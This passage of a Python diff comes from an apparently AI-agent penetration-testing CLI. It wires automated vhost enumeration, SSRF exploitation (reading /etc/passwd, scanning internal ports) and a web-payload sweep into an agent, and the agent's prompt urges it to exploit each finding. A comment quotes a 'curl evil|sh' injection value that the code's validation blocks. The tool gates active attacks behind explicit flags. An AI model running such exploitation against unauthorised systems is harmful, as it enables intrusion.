+            with urllib.request.urlopen(req, timeout=timeout) as r:  # noqa: S310 — http(s) target only
+                body = r.read(200_000).decode("latin-1", "replace")
+        except Exception:  # noqa: BLE001 — best-effort
+            continue
+        if body:
+            break
+    if not body:
+        return ""
+
+    counts: Counter[str] = Counter()
+    for h in re.findall(r"https?://([A-Za-z0-9][A-Za-z0-9.\-]{1,251})", body):
+        h = h.lower().rstrip(".")
+        if not h or h == orig or "." not in h or any(p in h for p in _PUBLIC_VHOST_NEEDLES):
+            continue
+        try:
+            ipaddress.ip_address(h)
+            continue  # it's an IP, not a vhost
+        except ValueError:
+            pass
+        counts[h] += 1
+    if not counts:
+        return ""
+    lab = [h for h in counts if h.endswith(_LAB_VHOST_TLDS)]
+    return max(lab, key=lambda h: counts[h]) if lab else counts.most_common(1)[0][0]
+
+
+def _add_vhost_to_hosts(hostname: str, ip: str) -> None:
+    """Best-effort: append '<ip> <hostname>' to /etc/hosts so the agent's OWN
+    tools (curl, etc.) resolve a discovered vhost. Enumeration itself does NOT
+    depend on this — it fuzzes via Host headers — so failure is non-fatal.
+
+    /etc/hosts is root-owned and investigate runs as a non-root user, so we try a
+    direct write, then sudo (no-op if unavailable)."""
+    if not hostname or not ip:
+        return
+    # SECURITY — hostname/ip come from the TARGET's redirect Location + ffuf vhost
+    # enumeration (attacker-influenced), and flow into a privileged write. Reject
+    # anything that isn't a strict hostname/IP charset so a value like
+    # "x'; curl evil|sh; echo '" can't break out (the old shell=True path was a
+    # target-driven command injection).
+    if not re.fullmatch(r"[A-Za-z0-9.\-]{1,253}", hostname) or not re.fullmatch(r"[0-9a-fA-F:.]{1,45}", ip):
+        return
+    try:
+        with open("/etc/hosts", encoding="utf-8") as f:
+            if hostname in f.read():
+                return
+    except OSError:
+        return
+    try:
+        with open("/etc/hosts", "a", encoding="utf-8") as f:
+            f.write(f"\n{ip} {hostname}\n")
+        return
+    except OSError:
+        pass
+    try:
+        import subprocess
+
+        # argv form (no shell) — even if validation were bypassed, the value can't
+        # reach a shell parser. tee reads the line from stdin.
+        subprocess.run(
+            ["sudo", "-n", "tee", "-a", "/etc/hosts"],
+            input=f"{ip} {hostname}\n".encode(),
+            capture_output=True,
+            timeout=10,
+        )
+    except Exception:  # noqa: BLE001
+        pass
+
+
+def _run_web_enum_phase(url: str, *, timeout: int = 180) -> list:
+    """F-WEBENUM — Deterministic web content enumeration BEFORE the LLM.
+
+    Runs ffuf for directory + vhost/subdomain discovery with the CORRECT
+    wordlists (intelligence.web_enum), auto-adds discovered vhosts to /etc/hosts,
+    and returns engage.Finding objects so the surface is injected as ground
+    truth. Weak local agents stall picking wordlists/commands here; making it
+    deterministic is what lets them reach a foothold. Skips silently on error.
+    """
+    import ipaddress
+    import socket
+    import subprocess
+    from urllib.parse import urlparse
+
+    try:
+        from kryon.cli.engage import Finding
+        from kryon.intelligence.web_enum import run_web_enum
+    except ImportError:
+        return []
+
+    def _runner(cmd: str, t: int) -> str:
+        try:
+            return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t).stdout  # noqa: S602 — fixed ffuf command, not user input
+        except Exception:  # noqa: BLE001
+            return ""
+
+    host = urlparse(url).hostname or ""
+    if not host:
+        return []
+
+    def _is_ip(h: str) -> bool:
+        try:
+            ipaddress.ip_address(h)
+            return True
+        except ValueError:
+            return False
+
+    ip = host if _is_ip(host) else ""
+    if not ip:
+        try:
+            ip = socket.gethostbyname(host)
+        except OSError:
+            ip = ""
+
+    # Reveal + seed the canonical vhost: a 30x redirect first, then (for targets that return 200 but
+    # hard-code their vhost in the body, e.g. a WordPress siteurl — THM Internal) the page content.
+    vhost_domain = _detect_redirect_host(url) or _detect_body_vhost(url)
+    if vhost_domain and ip:
+        _add_vhost_to_hosts(vhost_domain, ip)
+
+    try:
+        discoveries = run_web_enum(url, runner=_runner, vhost_domain=vhost_domain or None, timeout=timeout)
+    except Exception:  # noqa: BLE001
+        return []
+
+    # Auto-add discovered vhosts so every downstream tool resolves them.
+    for d in discoveries:
+        if d.kind == "vhost" and ip:
+            _add_vhost_to_hosts(d.value, ip)
+
+    findings: list = []
+    dirs = [d for d in discoveries if d.kind == "dir"]
+    vhosts = [d for d in discoveries if d.kind == "vhost"]
+    if dirs:
+        listing = ", ".join(f"/{d.value} ({d.status})" for d in dirs[:25])
+        findings.append(
+            Finding(
+                cwe="CWE-200",
+                severity="INFO",
+                host=host,
+                rule_id="WEB-ENUM-DIR",
+                message=f"{len(dirs)} path(s) discovered on {url} via ffuf (auto-calibrated)",
+                evidence=listing,
+            )
+        )
+    for v in vhosts:
+        findings.append(
+            Finding(
+                cwe="CWE-200",
+                severity="INFO",
+                host=host,
+                rule_id="WEB-ENUM-VHOST",
+                message=f"virtual host discovered: {v.value} (HTTP {v.status}) — added to /etc/hosts",
+                evidence=f"ffuf -H 'Host: {v.value}' (size {v.size})",
+            )
+        )
+    return findings
+
+
+def _is_ip_literal(host: str) -> bool:
+    import ipaddress
+
+    try:
+        ipaddress.ip_address(host)
+        return True
+    except ValueError:
+        return False
+
+
+def _make_ssrf_fetcher(target_ip: str, timeout: int = 8):
+    """Build an HTTP fetcher (method, base_url, params) -> (status, body) for the
+    SSRF prober. GET puts params in the query, POST in a urlencoded body. We send
+    the request to the target; the SERVER performs the SSRF fetch of the payload.
+
+    vhost handling (no DNS / no /etc/hosts in the container): when base_url's host
+    is NOT an IP, the request goes to ``target_ip`` with a ``Host:`` header — the
+    same trick web_enum uses, so it works without resolving the vhost."""
+    import urllib.error
+    import urllib.parse
+    import urllib.request
+
+    def _fetch(method: str, base_url: str, params: dict) -> tuple[int, str]:
+        try:
+            host = urllib.parse.urlparse(base_url).hostname or ""
+            headers: dict = {}
+            real = base_url
+            if host and not _is_ip_literal(host):
+                real = base_url.replace(host, target_ip, 1)
+                headers["Host"] = host
+            if method == "GET":
+                sep = "&" if "?" in real else "?"
+                url = real + sep + urllib.parse.urlencode(params)
+                req = urllib.request.Request(url, method="GET", headers=headers)
+            else:
+                data = urllib.parse.urlencode(params).encode()
+                req = urllib.request.Request(real, data=data, method="POST", headers=headers)
+            with urllib.request.urlopen(req, timeout=timeout) as resp:
+                return resp.status, resp.read(600_000).decode("utf-8", errors="replace")
+        except urllib.error.HTTPError as e:
+            body = e.read(600_000).decode("utf-8", errors="replace") if e.fp else ""
+            return e.code, body
+        except Exception:  # noqa: BLE001 — a failed probe is just a miss
+            return 0, ""
+
+    return _fetch
+
+
+def _run_ssrf_phase(urls: list[str], *, target_ip: str, timeout: int = 8) -> list:
+    """F-SSRF — Deterministic SSRF exploitation BEFORE/alongside the LLM.
+
+    For each URL (the target + vhosts web_enum discovered), find the SSRF param,
+    confirm via file:///etc/passwd, and port-scan 127.0.0.1 internally. Injects
+    confirmed SSRF + reachable internal ports as ground truth — the agent reaches
+    the SSRF stage but loops instead of systematizing the internal port-scan.
+    ACTIVE only. Skips silently on error."""
+    try:
+        from kryon.cli.engage import Finding
+        from kryon.intelligence.ssrf_probe import probe_ssrf
+    except ImportError:
+        return []
+
+    from urllib.parse import urlparse
+
+    fetcher = _make_ssrf_fetcher(target_ip, timeout)
+    findings: list = []
+    for url in urls:
+        try:
+            res = probe_ssrf(url, fetcher=fetcher)
+        except Exception:  # noqa: BLE001 — never break the run
+            continue
+        if not res.param:
+            continue
+        host = urlparse(url).hostname or url
+        ports = sorted(f.port for f in res.findings if f.kind == "internal_port")
+        ports_txt = f" Internal ports reachable via SSRF: {ports}." if ports else ""
+        leaked = next((f.evidence for f in res.findings if f.kind == "file_read"), "")
+        proof = "file:///etc/passwd readable" if leaked else "server-side fetch confirmed (loopback port divergence)"
+        findings.append(
+            Finding(
+                cwe="CWE-918",
+                severity="CRITICAL" if ports else "HIGH",
+                host=host,
+                rule_id="SSRF-CONFIRMED",
+                message=(
+                    f"SSRF confirmed on {url} via {res.method} param '{res.param}': {proof}.{ports_txt} "
+                    f"Pivot: hit the internal service(s) through {res.param}=http://127.0.0.1:<port>/."
+                ),
+                evidence=(f"/etc/passwd leak: {leaked[:120]}" if leaked else f"{res.method} {res.param}= SSRF sink"),
+            )
+        )
+    return findings
+
+
+def _webexploit_vf_to_findings(validated: list, host: str, *, capable: bool) -> list:
+    """Convert webexploit ValidatedFindings → engage.Finding.
+
+    Shared by the normal return path of ``_run_webexploit_phase`` AND the
+    timeout-partial recovery path in the sweep loop, so both yield identical
+    Finding shapes. Previously this loop lived only inline in
+    ``_run_webexploit_phase``; on a sweep timeout the whole webexploit output
+    was dropped (the deterministic floor — SQLi/IDOR/etc. — vanished from the
+    report). Extracting it lets the caller rebuild Findings from a partial
+    ``sink`` when the future times out.
+    """
+    from kryon.cli.engage import Finding  # noqa: PLC0415
+
+    rank = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
+    findings: list = []
+    for vf in validated:
+        # T3-A14: the default validator only re-GETs by status (a WAF 403 on replay
+        # flips a real injection to FALSE_POSITIVE). For the 4B keep dropping FPs
+        # (banca-safe); for a capable model keep them as low-confidence
+        # needs_verification so it can confirm the injection itself.
+        _is_fp = vf.status == "FALSE_POSITIVE"
+        if _is_fp and not capable:
+            continue
+        bf = vf.finding
+        findings.append(
+            Finding(
+                cwe=bf.cwe_id or "?",
+                severity=bf.severity,
+                host=host,
+                rule_id=bf.probe_id,
+                message=bf.title,
+                evidence=bf.evidence[:1024],
+                remediation=bf.remediation,
+                severity_rank=rank.get(bf.severity, 99),
+                needs_verification=(vf.status != "CONFIRMED"),
+                confidence=0.25 if _is_fp else (1.0 if vf.status == "CONFIRMED" else 0.5),
+                # T3-A12: preserve the exact vulnerable endpoint/param.
+                url=getattr(bf, "url", "") or "",
+            )
+        )
+    return findings
+
+
+def _run_webexploit_phase(
+    url: str,
+    *,
+    enable_nuclei: bool = False,
+    max_depth: int = 2,
+    max_urls: int = 40,
+    web_auth: dict | None = None,
+    nuclei_timeout: int = 0,
+    sink: list | None = None,
+) -> list:
+    """F57 deterministic web-pentest sweep → engage.Finding list (Phase 5).
+
+    Runs the unified webexploit pipeline (crawl → planner_web → hunter_web →
+    validator_web, offline / no LLM escalation) and converts non-FP
+    BankingFindings into engage.Finding so they inject as ground truth
+    like the other deterministic checks. This is the autonomous wiring of
+    the previously-dormant F57 pipeline (it was only reachable via the
+    ``/webpentest`` REPL command). ACTIVE — sends payloads; the caller
+    gates it behind ``--active``. Skips silently on any error.
+    """
+    from urllib.parse import urlparse
+
+    try:
+        from kryon.webexploit.crawler import CrawlConfig, Crawler
+        from kryon.webexploit.orchestrator import run_engagement
+        from kryon.webexploit.proxy import HttpSession
+    except ImportError:
+        return []
+
+    host = urlparse(url).hostname or ""
+    if not host:
+        return []
+
+    try:
+        session = HttpSession(base_url=url, verify_tls=False)
+        graph = Crawler(session, config=CrawlConfig(max_depth=max_depth, max_urls=max_urls)).crawl([url])
+
+        def _factory() -> HttpSession:
+            return HttpSession(base_url=url, verify_tls=False)
+
+        report = run_engagement(
+            session,
+            _factory,
+            graph,
+            base_url=url,
+            enable_nuclei=enable_nuclei,
+            nuclei_timeout=nuclei_timeout,
+            web_auth=web_auth,
+            sink=sink,
+        )
+    except Exception:  # noqa: BLE001 — LLM agent still runs
+        return []
+
+    from kryon.util.env import is_capable_model  # noqa: PLC0415
+
+    return _webexploit_vf_to_findings(report.findings, host, capable=is_capable_model())
+
+
+def _format_findings_for_prompt(findings: list) -> str:
+    """Render Finding list as markdown block to inject into agent prompt."""
+    if not findings:
+        return ""
+    from kryon.util.env import is_capable_model  # noqa: PLC0415
+
+    lines = ["", "## 🔬 Deterministic findings ya detectados (F203.M)", ""]
+    if is_capable_model():
+        # HEAD START, not a ceiling. Mirrors format_engine_ground_truth (engine_phase.py)
+        # so the REPL/engage AND investigate paths give the capable model the same
+        # offensive stance: exploit/re-scan/pivot ON TOP of the confirmed findings,
+        # not the 4B "narrá, no re-derives, validá si dudás" ceiling.
+        lines.append(
+            "Los siguientes hallazgos YA fueron confirmados por detectores "
+            "deterministicos previos al loop ReAct. Son **ground truth confirmado** "
+            "— tu HEAD START, no el techo. Encadená sobre ellos: **explotá cada uno**, "
+            "re-escaneá con otros parámetros si aporta, y extendé hacia acceso/impacto "
+            "y hallazgos que los detectores no ven (lógica de negocio, control de "
+            "acceso, info disclosure)."
+        )
+    else:
+        lines.append(
+            "Los siguientes hallazgos YA fueron confirmados por detectores "
+            "deterministicos previos al loop ReAct. **NO los repitas en tu "
+            "resumen final como si fueran tuyos** — son ground truth confirmado. "
+            "Tu trabajo es:"
+        )
+        lines.append("  1. Reconocerlos como inicio de evidencia")
+        lines.append("  2. EXTENDER con findings semánticos que los detectores no ven")
+        lines.append("     (e.g. lógica de negocio, control de acceso, info disclosure)")
+        lines.append("  3. Validar/contextualizar cada uno con un curl adicional si dudás")
+    lines.append("")
+    for f in findings:
+        cwe = getattr(f, "cwe", "?")
+        rule = getattr(f, "rule_id", "?")
+        severity = getattr(f, "severity", "?")
+        host = getattr(f, "host", "?")
+        message = getattr(f, "message", "")
+        evidence = getattr(f, "evidence", "")
+        lines.append(f"- **{cwe}** ({severity}) · `{rule}` · {host}")
+        if message:
+            # 400 (not 200) so the SSRF message's pivot instruction isn't cut.
+            lines.append(f"    {message[:400]}")
+        # Render the evidence — the concrete proof (the /etc/passwd leak, the path
+        # listing, the pivot). Without it the model gets "SSRF confirmed" but not
+        # what backs it, weakening its ability to extend/validate (the task above).
+        if evidence:
+            lines.append(f"    └ evidencia: {str(evidence)[:300]}")
+    lines.append("")
+    return "\n".join(lines)
+
+
+def run_investigate(args: argparse.Namespace) -> int:
+    """Main entry point for `kryon investigate`."""
+    from rich.console import Console
+
+    console = Console()
+
+    # F203.L — renamed from `prompt` to `query` to avoid dest collision
+    # with the parent CLI's `prompt` positional (which is set to None).
+    prompt = args.query
+    if args.url:
+        prompt = f"{prompt} (URL declarada explícitamente: {args.url})" if prompt else f"Investigá {args.url}"
+    if not prompt:
+        console.print("[red]error: provide a prompt or --url[/red]")
+        return 2
+
+    hints = _route_investigate_mode(prompt, args.url)
+    active = args.active or os.environ.get("KRYON_INVESTIGATE_ACTIVE", "").lower() in ("1", "true", "yes")
+    # --recon-only: active HTTP discovery but the tool layer refuses port-scan/exploit
+    # (the prompt could not stop a live nmap; recon_guard enforces it technically).
+    if getattr(args, "recon_only", False):
+        os.environ["KRYON_RECON_ONLY"] = "1"
+
+    console.print(f"[cyan]▸ Investigate mode:[/cyan] {hints.get('mode', 'general')}")
+    if active:
+        console.print("[yellow]⚠  ACTIVE mode — tools activas autorizadas[/yellow]")
+    else:
+        console.print("[green]✓ PASSIVE mode (default banca-safe)[/green]")
+
+    # Load skills based on prompt + hints
+    try:
+        from kryon.skills.loader import SkillLoader
+    except ImportError:
+        console.print("[red]SkillLoader unavailable[/red]")
+        return 3
+
+    loader = SkillLoader()
+    intent = prompt + " " + " ".join(hints.get("keywords", []))
+    matched = loader.match(profile={}, user_msg=intent)
+    if matched:
+        console.print(f"[dim]skills loaded: {[s.name for s in matched[:6]]} (total={len(matched)})[/dim]")
+
+    # Build agent + run loop
+    try:
+        from kryon.agents import get_agent_by_name
+        from kryon.sdk.agents.run import Runner
+        from kryon.sdk.agents.run_config_factory import get_run_config
+        from kryon.skills.unified_agent import update_agent_skills
+    except ImportError as e:
+        console.print(f"[red]agent dependencies missing: {e}[/red]")
+        return 4
+
+    os.environ["KRYON_AGENT_TYPE"] = "kryon"
+    try:
+        agent = get_agent_by_name("kryon", agent_id="INVESTIGATE")
+    except Exception as e:  # noqa: BLE001
+        console.print(f"[red]agent load failed: {e}[/red]")
+        return 5
+
+    if matched:
+        try:
+            update_agent_skills(agent, matched)
+        except Exception as e:  # noqa: BLE001 — best effort
+            console.print(f"[yellow]skill swap warning: {e}[/yellow]")
+
+    # SECURITY — passive mode is a TECHNICAL gate, not a prompt suggestion.
+    # Strip every non-passive-tier tool (nmap/nuclei/sqlmap/hydra/run_command/…)
+    # from the agent so the prompt is no longer the only thing keeping the run
+    # read-only (closes the prompt-only passive-gate bug).
+    if not active:
+        dropped = _enforce_passive_toolset(agent)
+        if dropped:
+            console.print(
+                f"[dim]passive mode: {dropped} active tool(s) removed from the agent (use --active to enable)[/dim]"
+            )
+
+    full_prompt = _build_investigate_prompt(prompt, hints, active=active)
+
+    # F203.M — Hybrid mode: run deterministic checks ANTES del agent, inyectar
+    # findings al prompt. Default ON cuando hay URL detectable.
+    deterministic_findings: list = []
+    if not args.no_hybrid and hints.get("mode") == "code_sast" and hints.get("code_path"):
+        # Mythos-style source review for local code trees.
+        console.print(
+            f"[cyan]🔬 source-review phase:[/cyan] {hints['code_path']} "
+            f"(max {args.sast_max_files} files, model "
+            f"{os.environ.get('KRYON_SOURCE_REVIEW_MODEL', 'kryon-local')})"
+        )
+        # Deterministic SAST ruleset FIRST (cheap, reproducible floor), then the
+        # LLM source review for the subtle/contextual bugs.
+        try:
+            from kryon.intelligence.sast_rules import scan_path, to_findings
+
+            sast = scan_path(hints["code_path"], max_files=max(args.sast_max_files * 20, 500))
+            if sast:
+                console.print(f"[cyan]🧬 deterministic SAST:[/cyan] {len(sast)} pattern hit(s)")
+                deterministic_findings.extend(to_findings(sast, host=hints["code_path"]))
+        except Exception:  # noqa: BLE001
+            pass
+        sr = _run_source_review_phase(hints["code_path"], max_files=args.sast_max_files)
+        if sr:
+            deterministic_findings.extend(sr)
+    if not args.no_hybrid and hints.get("mode") != "code_sast":
+        urls_to_check = list(hints.get("urls") or [])
+        if args.url and args.url not in urls_to_check:
+            urls_to_check.append(args.url)
+        # Dedup: the prompt URL-extractor and --url routinely yield the same host
+        # with/without a trailing slash, which made the expensive per-URL phases
+        # (ffuf web-enum) run twice. Normalize on trailing slash + case.
+        _seen_urls: set[str] = set()
+        _deduped_urls: list[str] = []
+        for _u in urls_to_check:
+            _key = _u.rstrip("/").lower()
+            if _key not in _seen_urls:
+                _seen_urls.add(_key)
+                _deduped_urls.append(_u)
+        urls_to_check = _deduped_urls
+        # Backstop wall-bound per URL. The detectors carry their own per-probe
+        # timeouts, but this guarantees one misbehaving detector can't block the
+        # whole run (which is sync here, before the async agent loop).
+        import concurrent.futures
+
+        _det_timeout = float(os.environ.get("KRYON_DETERMINISTIC_TIMEOUT_S", "120"))
+        for u in urls_to_check:
+            try:
+                df = _run_with_timeout(
+                    _run_deterministic_phase,
+                    u,
+                    ssh_user=args.ssh_user,
+                    ssh_password=args.ssh_pass,
+                    ssh_key=args.ssh_key,
+                    db_user=args.db_user,
+                    db_password=args.db_pass,
+                    include_dns=args.include_dns_checks,
+                    include_smb=args.include_smb_checks,
+                    wall_timeout=_det_timeout,
+                )
+            except concurrent.futures.TimeoutError:
+                console.print(f"[yellow]⚠ fase determinista excedió {_det_timeout:.0f}s para {u} — saltando[/yellow]")
+                df = None
+            except Exception as e:  # noqa: BLE001 — detectors must never break the run
+                console.print(f"[yellow]deterministic phase warning ({u}): {e}[/yellow]")
+                df = None
+            if df:
+                deterministic_findings.extend(df)
+
+        # Fase 3 — OpenVAS/Greenbone active vuln scan (opt-in --openvas,
+        # double-gated by KRYON_OPENVAS_FIRE). Heavy + long → generous wall
+        # budget. Findings are normalized + applicability-filtered like every
+        # other deterministic source, then injected as ground truth.
+        if active and getattr(args, "openvas", False):
+            from kryon.integrations.openvas import is_openvas_enabled
+
+            if not is_openvas_enabled():
+                console.print(
+                    "[yellow]⚠ --openvas pedido pero KRYON_OPENVAS_FIRE no está activo — "
+                    "saltando (el scan activo requiere opt-in explícito)[/yellow]"
+                )
+            else:
+                from urllib.parse import urlparse as _up_ov
+
+                _ov_hosts = list(dict.fromkeys(h for u in urls_to_check if (h := _up_ov(u).hostname)))
+                _ov_timeout = float(os.environ.get("KRYON_OPENVAS_TIMEOUT_S", "3600"))
+                for _h in _ov_hosts:
+                    try:
+                        console.print(f"[cyan]🛡️ openvas phase:[/cyan] {_h} (Greenbone stock vía GMP)")
+                        ovf = _run_with_timeout(_run_openvas_phase, _h, tech_stack=None, wall_timeout=_ov_timeout)
+                        if ovf:
+                            console.print(f"[cyan]🛡️ openvas:[/cyan] {len(ovf)} finding(s) en {_h}")
+                            deterministic_findings.extend(ovf)
+                    except concurrent.futures.TimeoutError:
+                        console.print(f"[yellow]⚠ openvas excedió {_ov_timeout:.0f}s para {_h} — saltando[/yellow]")
+                    except Exception as e:  # noqa: BLE001 — never break the run
+                        console.print(f"[yellow]openvas warning ({_h}): {e}[/yellow]")
+
+        # Cinc Auditor compliance-as-code (opt-in --cinc, gated by
+        # KRYON_CINC_FIRE). Runs the dev-sec/CIS profiles over SSH; FAILED
+        # controls → findings, applicability-filtered.
+        if active and getattr(args, "cinc", False):
+            from kryon.integrations.cinc import is_cinc_enabled
+
+            if not is_cinc_enabled():
+                console.print("[yellow]⚠ --cinc pedido pero KRYON_CINC_FIRE no está activo — saltando[/yellow]")
+            else:
+                from urllib.parse import urlparse as _up_cinc
+
+                _cinc_hosts = list(dict.fromkeys(h for u in urls_to_check if (h := _up_cinc(u).hostname)))
+                _cinc_timeout = float(os.environ.get("KRYON_CINC_TIMEOUT_S", "900"))
+                for _h in _cinc_hosts:
+                    try:
+                        console.print(f"[cyan]📋 cinc phase:[/cyan] {_h} (dev-sec profiles vía SSH)")
+                        cf = _run_with_timeout(
+                            _run_cinc_phase,
+                            _h,
+                            ssh_user=args.ssh_user,
+                            ssh_password=args.ssh_pass,
+                            ssh_key=args.ssh_key,
+                            wall_timeout=_cinc_timeout,
+                        )
+                        if cf:
+                            console.print(f"[cyan]📋 cinc:[/cyan] {len(cf)} finding(s) en {_h}")
+                            deterministic_findings.extend(cf)
+                    except concurrent.futures.TimeoutError:
+                        console.print(f"[yellow]⚠ cinc excedió {_cinc_timeout:.0f}s para {_h} — saltando[/yellow]")
+                    except Exception as e:  # noqa: BLE001 — never break the run
+                        console.print(f"[yellow]cinc warning ({_h}): {e}[/yellow]")
+
+        # Lynis host audit (opt-in --lynis, gated by KRYON_LYNIS_FIRE). Runs
+        # lynis ON each target host over SSH; warnings/suggestions → findings.
+        if active and getattr(args, "lynis", False):
+            from kryon.integrations.lynis import is_lynis_enabled
+
+            if not is_lynis_enabled():
+                console.print("[yellow]⚠ --lynis pedido pero KRYON_LYNIS_FIRE no está activo — saltando[/yellow]")
+            else:
+                from urllib.parse import urlparse as _up_lyn
+
+                _lyn_hosts = list(dict.fromkeys(h for u in urls_to_check if (h := _up_lyn(u).hostname)))
+                _lyn_timeout = float(os.environ.get("KRYON_LYNIS_TIMEOUT_S", "600"))
+                for _h in _lyn_hosts:
+                    try:
+                        console.print(f"[cyan]🩺 lynis phase:[/cyan] {_h} (host audit vía SSH)")
+                        lf = _run_with_timeout(
+                            _run_lynis_phase,
+                            _h,
+                            ssh_user=args.ssh_user,
+                            ssh_key=args.ssh_key,
+                            wall_timeout=_lyn_timeout,
+                        )
+                        if lf:
+                            console.print(f"[cyan]🩺 lynis:[/cyan] {len(lf)} finding(s) en {_h}")
+                            deterministic_findings.extend(lf)
+                    except concurrent.futures.TimeoutError:
+                        console.print(f"[yellow]⚠ lynis excedió {_lyn_timeout:.0f}s para {_h} — saltando[/yellow]")
+                    except Exception as e:  # noqa: BLE001 — never break the run
+                        console.print(f"[yellow]lynis warning ({_h}): {e}[/yellow]")
+
+        # F-WEBENUM — deterministic content enumeration (directories + vhosts/
+        # subdomains via ffuf, correct wordlists + auto-calibration) BEFORE the
+        # webexploit sweep + the LLM. ACTIVE only (sends many requests). Seeds
+        # /etc/hosts with discovered vhosts so downstream tools resolve them. This
+        # is the enumeration step weak local agents stall on — making it
+        # deterministic is what unblocks reaching a foothold.
+        if active:
+            _wenum_timeout = float(os.environ.get("KRYON_WEBENUM_TIMEOUT_S", "300"))
+            for u in urls_to_check:
+                if not u.lower().startswith(("http://", "https://")):
+                    continue
+                try:
+                    console.print(f"[cyan]🌐 web-enum phase:[/cyan] {u} (dirs + vhosts via ffuf)")
+                    wf = _run_with_timeout(
+                        _run_web_enum_phase, u, timeout=int(_wenum_timeout), wall_timeout=_wenum_timeout + 30
+                    )
+                    if wf:
+                        console.print(f"[cyan]🌐 web-enum:[/cyan] {len(wf)} findings en {u}")
+                        deterministic_findings.extend(wf)
+                except concurrent.futures.TimeoutError:
+                    console.print(f"[yellow]⚠ web-enum excedió {_wenum_timeout:.0f}s para {u} — saltando[/yellow]")
+                except Exception as e:  # noqa: BLE001 — never break the run
+                    console.print(f"[yellow]web-enum warning ({u}): {e}[/yellow]")
+
+        # F-SSRF — deterministic SSRF exploitation against the target + the vhosts
+        # web_enum discovered (where the vulnerable app usually lives). Finds the
+        # SSRF param, confirms via file://, and port-scans 127.0.0.1 internally —
+        # the step the agent loops on. ACTIVE only. Injects confirmed SSRF +
+        # reachable internal ports as ground truth.
+        if active:
+            import re as _re
+
+            _ssrf_targets: list[str] = list(urls_to_check)
+            for _f in deterministic_findings:
+                if getattr(_f, "rule_id", "") == "WEB-ENUM-VHOST":
+                    _m = _re.search(r"discovered:\s*([A-Za-z0-9.\-]+)", getattr(_f, "message", ""))
+                    if _m:
+                        _ssrf_targets.append(f"http://{_m.group(1)}")
+            _ssrf_targets = list(dict.fromkeys(_ssrf_targets))  # dedup, keep order
+            # The vhost rewrite needs the target's IP (no DNS in the container).
+            from urllib.parse import urlparse as _up
+
+            _hosts = [h for u in urls_to_check if (h := _up(u).hostname)]
+            _target_ip = next((h for h in _hosts if _is_ip_literal(h)), _hosts[0] if _hosts else "")
+            try:
+                console.print(
+                    f"[cyan]🎯 ssrf phase:[/cyan] {len(_ssrf_targets)} target(s) (param + internal port-scan)"
+                )
+                sf = _run_with_timeout(
+                    _run_ssrf_phase,
+                    _ssrf_targets,
+                    target_ip=_target_ip,
+                    wall_timeout=float(os.environ.get("KRYON_SSRF_TIMEOUT_S", "360")),
+                )
+                if sf:
+                    console.print(f"[cyan]🎯 ssrf:[/cyan] {len(sf)} confirmado(s)")
+                    deterministic_findings.extend(sf)
+            except concurrent.futures.TimeoutError:
+                console.print("[yellow]⚠ ssrf phase excedió el budget — saltando[/yellow]")
+            except Exception as e:  # noqa: BLE001 — never break the run
+                console.print(f"[yellow]ssrf phase warning: {e}[/yellow]")
+
+        # F57 webexploit sweep — ACTIVE only (sends payloads). Adds the unified
+        # deterministic web-vuln coverage (SQLi/XSS/LFI/SSTI/cmd-inj/XXE/IDOR/
+        # SSRF/CORS/JWT/git-leak) + opt-in nuclei known-CVE library. This is the
+        # autonomous wiring of the F57 pipeline (was /webpentest-only).
+        # Aligns with engage: the payload-injection sweep requires KRYON_RED_TEAM,
+        # not just --active (sending exploit payloads is the highest-intrusiveness
+        # step, so it carries the same explicit gate in both entry points).
+        # T3-A6: a capable model also unlocks it under --active alone — --active already
+        # asserts written authorization, and without the injection sweep the model got
+        # posture but no explotable foothold. The red-team double-gate was the 4B's
+        # extra safety; capability + active is an explicit operator choice.
+        from kryon.util.env import is_capable_model as _is_capable  # noqa: PLC0415
+
+        if active and (is_red_team() or _is_capable()):
+            enable_nuclei = True  # past the RED_TEAM gate → full sweep incl. nuclei
+            # Comprehensive sweep (surface discovery + injection over dozens of
+            # endpoints + headless cookie check + authenticated IDOR/mass-assign)
+            # is heavy on rich targets; 900s default so its findings aren't
+            # dropped. Override with KRYON_WEBEXPLOIT_TIMEOUT_S.
+            _wx_timeout = float(os.environ.get("KRYON_WEBEXPLOIT_TIMEOUT_S", "900"))
+            # Authenticated probing mode — operator-supplied web creds unlock
+            # IDOR / mass-assignment probes (unreachable unauthenticated).
+            _web_auth = None
+            if getattr(args, "web_login_url", "") and getattr(args, "web_user", ""):
+                login_url = args.web_login_url
+                if not login_url.lower().startswith(("http://", "https://")) and args.url:
+                    login_url = args.url.rstrip("/") + "/" + login_url.lstrip("/")
+                _web_auth = {
+                    "login_url": login_url,
+                    "username": args.web_user,
+                    "password": args.web_pass,
+                    "token_json_path": args.web_token_path,
+                }
+            from urllib.parse import urlparse as _urlparse  # noqa: PLC0415
+
+            from kryon.util.env import is_capable_model as _cap  # noqa: PLC0415
+
+            for u in urls_to_check:
+                if not u.lower().startswith(("http://", "https://")):
+                    continue
+                # T3-A15 breadth-preservation: a shared sink lets us recover the
+                # partial ValidatedFindings the pipeline had already produced when
+                # the future times out. Previously a sweep that ran past the budget
+                # was dropped ENTIRELY (wf=None), so the whole deterministic web
+                # floor — SQLi/IDOR/cookie/etc. — vanished from the report even
+                # though it had already been found. The thread keeps running after
+                # a concurrent.futures timeout, but `sink[:] = validated` inside
+                # run_engagement is written incrementally, so whatever completed is
+                # visible here.
+                _wx_sink: list = []
+                try:
+                    wf = _run_with_timeout(
+                        _run_webexploit_phase,
+                        u,
+                        enable_nuclei=enable_nuclei,
+                        web_auth=_web_auth,
+                        nuclei_timeout=_wx_timeout,
+                        wall_timeout=_wx_timeout,
+                        sink=_wx_sink,
+                    )
+                except concurrent.futures.TimeoutError:
+                    if _wx_sink:
+                        _host = _urlparse(u).hostname or ""
+                        wf = _webexploit_vf_to_findings(_wx_sink, _host, capable=_cap())
+                        console.print(
+                            f"[yellow]⚠ webexploit sweep excedió {_wx_timeout:.0f}s para {u} — "
+                            f"conservando {len(wf)} finding(s) parcial(es)[/yellow]"
+                        )
+                    else:
+                        console.print(
+                            f"[yellow]⚠ webexploit sweep excedió {_wx_timeout:.0f}s para {u} — saltando (sin parciales)[/yellow]"
+                        )
+                        wf = None
+                except Exception as e:  # noqa: BLE001 — must never break the run
+                    console.print(f"[yellow]webexploit sweep warning ({u}): {e}[/yellow]")
+                    wf = None
+                if wf:
+                    console.print(f"[cyan]🕸 webexploit sweep:[/cyan] {len(wf)} findings en {u}")
+                    deterministic_findings.extend(wf)
+
